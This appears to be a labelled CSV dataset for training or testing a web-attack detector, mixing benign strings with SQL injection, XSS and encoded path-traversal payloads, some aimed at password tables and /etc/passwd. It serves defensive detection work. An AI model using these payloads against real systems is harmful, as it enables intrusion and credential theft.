"payload","label"
".%00.%c1%9c.%00.%c1%9cboot.ini","Suspicious"
"cusanelli@wdsl.ao","Normal"
"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SQLi"
"<param draggable=""true"" ondragstart=""alert(1)"">test</param>","XSS"
"%2e.%25c0%25af%2e.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts","Suspicious"
"<datalist onmouseleave=""alert(1)"">test</datalist>","XSS"
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i","SQLi"
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840","SQLi"
"SELECT * FROM upward WHERE each NOT LIKE 'moving%'","Normal"
"ate7t3r","Normal"
"%5C..%e0%80%af%5C..%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts","Suspicious"
"%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc%25c0%25afpasswd","Suspicious"
"1%'  )  )   union all select null,null,null--","SQLi"
"<audio draggable=""true"" ondragstart=""alert(1)"">test</audio>","XSS"
"1""  )  )   as ljhz where 2416 = 2416","SQLi"
"According police , autopsy showed evidence capital offence","Normal"
"culham","Normal"
"<li class=""toclevel-1 tocsection-70""><a href=""#See_also""><span class=""tocnumber"">11","Normal"
"dey","Normal"
".%2e%c0%2fetc%c0%2fissue","Suspicious"
"..../%2f..../%2f..../%2f..../%2f..../%2fetc%2fpasswd","Suspicious"
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationstart=""alert(1)""></content>","XSS"
"-5728 )  where 8663 = 8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#","SQLi"
"kinsey@etnics.fm","Normal"
"1  )  )   and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (  3626 = 3626","SQLi"
"SELECT Count ( * )  AS practice","Normal"
"1'  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 'gbhd' = 'gbhd","SQLi"
"%e0%80%ae%e0%80%ae%c0%qf%e0%80%ae%e0%80%ae%c0%qf%e0%80%ae%e0%80%ae%c0%qf%e0%80%ae%e0%80%ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts","Suspicious"
"<span ondblclick=""alert(1)"">test</span>","XSS"
"The recalled models built August 1 September 10","Normal"
"<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>","XSS"
".../.%%35%%63.../.%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts","Suspicious"
"%c0%2e%c0%2e%c1%1c%c0%2e%c0%2e%c1%1c%c0%2e%c0%2e%c1%1cetc%c1%1cissue","Suspicious"
"%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"/etc/opt/ipf/ipf.conf","Suspicious"
"calle sant erasme, 81","Normal"
"<p>Moravec's paradox can be extended to many forms of social intelligence.","Normal"
"UPDATE particular SET melted = 'hunter'WHERE example = 'satellites'","Normal"
"To make people laugh , reduce pain , &apos;s I &apos;m","Normal"
".?%c1%8s.?%c1%8s.?%c1%8setc%c1%8sissue","Suspicious"
"<i onpointerenter=alert(1)>XSS</i>","XSS"
"<style>:target {transform: rotate(180deg);}</style><canvas id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></canvas>","XSS"
".%2e%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'","SQLi"
"kjer@multibuscador.com.ph","Normal"
"7012","Normal"
"<textarea onmousemove=""alert(1)"">test</textarea>","XSS"
"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--","SQLi"
"%252e%252e%c0%5c%252e%252e%c0%5cetc%c0%5cissue","Suspicious"
"esite","Normal"
"79","Normal"
"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#","SQLi"
"<keygen autofocus onfocusin=alert(1)>","XSS"
"-7559"" or 8792  =  6905--","SQLi"
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>","XSS"
"%5C..%%32%%66%5C..%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts","Suspicious"
"1%'  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  '%' = '","SQLi"
"&quot; And slice disappear inside Jumbo , &quot; said , announcing sampling product","Normal"
"%2e.%f8%80%80%80%af%2e.%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"cejadero","Normal"
"select case when 8975  =  2352 then 1 else null end--","SQLi"
"%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"SELECT angry, men, money FROM section WHERE throat  IS NULL","Normal"
"SELECT * FROM page WHERE thick NOT LIKE '[slightly]%'","Normal"
"1"" where 4213  =  4213 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SQLi"
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh","SQLi"
"0x2e0x2e%252f0x2e0x2e%252f0x2e0x2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts","Suspicious"
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>","XSS"
"%c0.%c0.\%c0.%c0.\etc\passwd","Suspicious"
"%2e%2e%2fetc%2fpasswd","Suspicious"
"<img2 onpointerleave=alert(1)>XSS</img2>","XSS"
"43120","Normal"
"-4541""   )    )    or make_set  (  4821  =  5233,5233  )   and    (    (   ""xfex""  =  ""xfex","SQLi"
"demonlatra","Normal"
"/etc/syslogd.conf","Suspicious"
"/usr/lib/php.ini","Suspicious"
"/.../.../.../.../.../","Suspicious"
"%2e%c0%ae%2f%2e%c0%ae%2f%2e%c0%ae%2fboot.ini","Suspicious"
"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,1977 ) --","SQLi"
"%2e.%c1%9c%2e.%c1%9c%2e.%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"<address onmouseup=""alert(1)"">test</address>","XSS"
"1%""  )  )   union all select null,null,null,null#","SQLi"
"cornejoviniero plasencia","Normal"
"if  (  2643  =  1393  )   select 2643 else drop function nqss--","SQLi"
"1%'  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","SQLi"
"-3501'  )  )   )  or make_set ( 7122 = 6158,6158 )  and   (  (   ( 'mlfl' like 'mlfl","SQLi"
"sancarranco cantabella","Normal"
"1'||  (  select 'dajl' from dual where 8440  =  8440","SQLi"
"%uff0e%uff0e%252f%uff0e%uff0e%252f%uff0e%uff0e%252f%uff0e%uff0e%252f%uff0e%uff0e%252fboot.ini","Suspicious"
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'qvoy' = 'qvoy","SQLi"
"<th onbeforecopy=""alert(1)"" contenteditable>test</th>","XSS"
"SELECT * FROM off ORDER BY wealth DESC","Normal"
"<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>","XSS"
"9195","Normal"
"0680099679266442","Normal"
"castell de rugat","Normal"
"em8o0a2","Normal"
"1'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'ajka' = 'ajka","SQLi"
"%c0%ae%c0%ae%c1%1c%c0%ae%c0%ae%c1%1c%c0%ae%c0%ae%c1%1c%c0%ae%c0%ae%c1%1cetc%c1%1cissue","Suspicious"
"..//windows//system32//drivers//etc//hosts","Suspicious"
"%25c0%25ae%25c0%25ae0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts","Suspicious"
"....//....//....//....//....//....//....//....//....//etc/passwd","Suspicious"
"65886361d","Normal"
"/var/log/ftplog","Suspicious"
"?.%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts","Suspicious"
"%5C..%5cboot.ini","Suspicious"
"<kbd onmouseup=""alert(1)"">test</kbd>","XSS"
"%%c0%6e%c0%6e%255c%%c0%6e%c0%6e%255cetc%255cpasswd","Suspicious"
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )","SQLi"
"if ( 9770 = 9748 )  select 9770 else drop function zyuo--","SQLi"
"<caption onbeforecopy=""alert(1)"" contenteditable>test</caption>","XSS"
"<div draggable=""true"" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>","XSS"
"%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216etc%u2216issue","Suspicious"
"select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'","SQLi"
".?%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts","Suspicious"
"SELECT * FROM spent WHERE nobody  BETWEEN 10 AND 20","Normal"
"50228","Normal"
"<li><a href=""/wiki/Networking_hardware"" title=""Networking hardware"">Network components </a> </li>","Normal"
"7699840000000000","Normal"
"%uff0e%uff0e%2f%uff0e%uff0e%2fetc%2fissue","Suspicious"
"1' )  as juxt where 5956 = 5956 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --","SQLi"
"1%'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null#","SQLi"
"SELECT * FROM closely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sum","Normal"
"<object onpointerup=alert(1)>XSS</object>","XSS"
".?%uF025.?%uF025.?%uF025etc%uF025issue","Suspicious"
"1%"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""%"" = ""","SQLi"
"select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1","SQLi"
"13270596x","Normal"
".%00.%%35%%63etc%%35%%63issue","Suspicious"
".?/.?/boot.ini","Suspicious"
"<samp onbeforecut=""alert(1)"" contenteditable>test</samp>","XSS"
"..\\\..\\\..\\\..\\\etc\\\passwd","Suspicious"
"SELECT mysterious","Normal"
"5607274841156559","Normal"
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>","XSS"
"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>","XSS"
"/var/log/proftpd.access_log","Suspicious"
"bette","Normal"
"valverde de valdelacasa","Normal"
"<element oncontextmenu=""alert(1)"">test</element>","XSS"
"chaiman","Normal"
"-6854"" where 7794  =  7794 union all select 7794,7794--","SQLi"
"valencina de la concepcin","Normal"
"?.%252fetc%252fissue","Suspicious"
"8833519281549056","Normal"
"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SQLi"
"calle manuel maria de arjona 80,","Normal"
"SELECT castle ( s )  FROM with LEFT JOIN","Normal"
"1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa","SQLi"
"<hgroup oncontextmenu=""alert(1)"">test</hgroup>","XSS"
"%2e.%c0%qf%2e.%c0%qfetc%c0%qfissue","Suspicious"
"92086641t","Normal"
"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '","SQLi"
"SELECT TOP 3 * FROM stood SELECT * FROM brick 3SELECT * FROM crack","Normal"
"1 and 1 = 1","SQLi"
"1   )    )    and 4637  =  1408 and    (    (   6509  =  6509","SQLi"
"8936","Normal"
"' or username is not NULL or username  =  '","SQLi"
"-8397'  )  )   )  or 2171 = 4788","SQLi"
"<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>","XSS"
"1 where 3802  =  3802 and 2006  =  2006","SQLi"
"santoyo@deportechino.edu","Normal"
"<li><a href=""/wiki/Intentionality"" title=""Intentionality"">Intentionality </a> </li>","Normal"
"1'+  (  select tart where 9861  =  9861","SQLi"
"9ei91n","Normal"
"1 )  as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --","SQLi"
"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #","SQLi"
"1'|| ( select 'baur' from dual where 9384 = 9384 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","SQLi"
"major del raval, 14 6?c","Normal"
"The dispute focuses width seats provided long-haul flights economy passengers - always ones courted airlines , whose allocated space holds key efficiency claims latest jets offered Airbus SAS Boeing Co","Normal"
"<bdo onpointermove=alert(1)>XSS</bdo>","XSS"
"<element onmouseleave=""alert(1)"">test</element>","XSS"
"SELECT * FROM handsome WHERE five = 'anyway' FETCH FIRST 3 ROWS ONLY","Normal"
"..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"-3867%'  )   or 3084  =  5633 and   (  '%'  =  '","SQLi"
"55235483v","Normal"
"%c0%5e%c0%5e%bg%qf%c0%5e%c0%5e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"SELECT * FROM plane","Normal"
"%c0%ae%c0%ae0x5c%c0%ae%c0%ae0x5c%c0%ae%c0%ae0x5c%c0%ae%c0%ae0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts","Suspicious"
"-2174'  )  )   as zhoz where 4185 = 4185 order by 1#","SQLi"
"<li><a href=""/wiki/Hugh_of_Saint_Victor"" title=""Hugh of Saint Victor"">Hugh of Saint Victor </a> </li>","Normal"
"1"" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""hbgv"" = ""hbgv","SQLi"
"1""   )    )    as uxnc where 8041  =  8041 and 9198  =  9198--","SQLi"
"SELECT COUNT ( common ) FROM your","Normal"
"select sleep  (  5  )   and    (    (   ""%""  =  ""","SQLi"
"SELECT COUNT ( active ) FROM block","Normal"
"<ins onmouseup=""alert(1)"">test</ins>","XSS"
"-8005""  )   union all select 5213,5213,5213,5213,5213--","SQLi"
"SELECT * FROM putting ORDER BY thought, nice","Normal"
"..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cpasswd","Suspicious"
"%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5c%c0%ae%c0%ae%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","Suspicious"
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'cjre' = 'cjre","SQLi"
"<style>:target {transform: rotate(180deg);}</style><br id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></br>","XSS"
"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SQLi"
"1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","SQLi"
"He coined term &quot; gender identity &quot; argued social environmental cues -- parents raised child -- interacted child &apos;s genes hormones shape whether person identified male female","Normal"
"%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qf%2e%2e%c0%qfetc%c0%qfissue","Suspicious"
"%e0%80%ae%e0%80%ae%c1%8s%e0%80%ae%e0%80%ae%c1%8s%e0%80%ae%e0%80%ae%c1%8s%e0%80%ae%e0%80%ae%c1%8sboot.ini","Suspicious"
"<base onkeypress=""alert(1)"" contenteditable>test</base>","XSS"
"<legend onmousemove=""alert(1)"">test</legend>","XSS"
"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SQLi"
"%c0%5e%c0%5e%c0%2f%c0%5e%c0%5e%c0%2f%c0%5e%c0%5e%c0%2f%c0%5e%c0%5e%c0%2f%c0%5e%c0%5e%c0%2fboot.ini","Suspicious"
"1 or sleep  (  5  )  -- nrzf","SQLi"
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SQLi"
"24206","Normal"
"%2e%2e0x5c%2e%2e0x5cboot.ini","Suspicious"
"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --","SQLi"
"%2e.0x2f%2e.0x2f%2e.0x2f%2e.0x2f%2e.0x2f%2e.0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts","Suspicious"
"1' where 6417 = 6417 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","SQLi"
"%c0%ae%c0%ae%c1%8s%c0%ae%c0%ae%c1%8s%c0%ae%c0%ae%c1%8s%c0%ae%c0%ae%c1%8sboot.ini","Suspicious"
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></th>","XSS"
".../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"<samp onpointerenter=alert(1)>XSS</samp>","XSS"
"altares pellizza","Normal"
"Ben Greenman: The Tenth Anniversary New York Comedy Festival: The New Yorker One could argue New York City birthplace standup comedy America: nearly hundred years ago , vaudevillian Frank Fay , served master ceremonies Palace Theatre , Broadway , started telling jokes directly crowd , conversational manner","Normal"
"drohocka@baybay.mq","Normal"
"1 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )","SQLi"
"According The Star newspaper , new bill effectively hand government &quot; stranglehold media , &quot; The Standard said democracy free speech Kenya &quot; dealt major blow &quot; lambasted bill &quot; draconian","Normal"
"6 billion September 30 , marginally December 31","Normal"
"-7164%' or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and '%' = '","SQLi"
"<legend onpointerup=alert(1)>XSS</legend>","XSS"
"1"" )  as jidc where 6093 = 6093 and 9198 = 9198--","SQLi"
".../.%f8%80%80%80%afetc%f8%80%80%80%afissue","Suspicious"
"<samp onpointerleave=alert(1)>XSS</samp>","XSS"
"marye@theroxyblue.mr","Normal"
"5266363130660418","Normal"
"end and ""xouo"" like ""xouo","SQLi"
"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  ""","SQLi"
"%c0%ee%c0%ee%c1%1c%c0%ee%c0%ee%c1%1c%c0%ee%c0%ee%c1%1cetc%c1%1cissue","Suspicious"
"%c0%ee%c0%ee%uEFC8%c0%ee%c0%ee%uEFC8%c0%ee%c0%ee%uEFC8%c0%ee%c0%ee%uEFC8etc%uEFC8passwd","Suspicious"
"62386870z","Normal"
"../../../boot.ini%00index.htm","Suspicious"
"6795968081758370","Normal"
"..%f0%80%80%af..%f0%80%80%af..%f0%80%80%afetc%f0%80%80%afpasswd","Suspicious"
"1   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SQLi"
"%c0%5e%c0%5e%c0%qf%c0%5e%c0%5e%c0%qf%c0%5e%c0%5e%c0%qf%c0%5e%c0%5e%c0%qf%c0%5e%c0%5e%c0%qf%c0%5e%c0%5e%c0%qfetc%c0%qfpasswd","Suspicious"
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'bzak' like 'bzak","SQLi"
"1  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  4686 = 4686","SQLi"
"..%01%c1%8s..%01%c1%8s..%01%c1%8s..%01%c1%8s..%01%c1%8s..%01%c1%8sboot.ini","Suspicious"
"1"" )  where 6843 = 6843 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","Suspicious"
"<fieldset onpointerup=alert(1)>XSS</fieldset>","XSS"
"%5C..%255c%5C..%255c%5C..%255c%5C..%255c%5C..%255cetc%255cpasswd","Suspicious"
"-6014"" or make_set ( 3003 = 2609,2609 )","SQLi"
"<body onpointerover=alert(1)>XSS</body>","XSS"
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>","XSS"
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>","XSS"
"%c0.%c0.%c0%af%c0.%c0.%c0%af%c0.%c0.%c0%af%c0.%c0.%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"-9566%""  )   union all select 7973,7973,7973,7973--","SQLi"
"%2A%28%7C%28mail%3D%2A%29%29","SQLi"
"fo9nece9","Normal"
"<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>","XSS"
"57471201c","Normal"
"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq","SQLi"
"%c0.%c0.%u2216boot.ini","Suspicious"
"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb","SQLi"
"SELECT * FROM front WHERE wise = 'earn'","Normal"
"%e0%80%ae%e0%80%ae%%32%%66%e0%80%ae%e0%80%ae%%32%%66%e0%80%ae%e0%80%ae%%32%%66%e0%80%ae%e0%80%ae%%32%%66%e0%80%ae%e0%80%ae%%32%%66boot.ini","Suspicious"
"SELECT damage ( s )  FROM during FULL OUTER JOIN","Normal"
"-8129'  )  )   )  union all select 4531,4531,4531#","SQLi"
"borrajo","Normal"
"&quot; The goal protection many developed plots land possible , &quot; said Häußler","Normal"
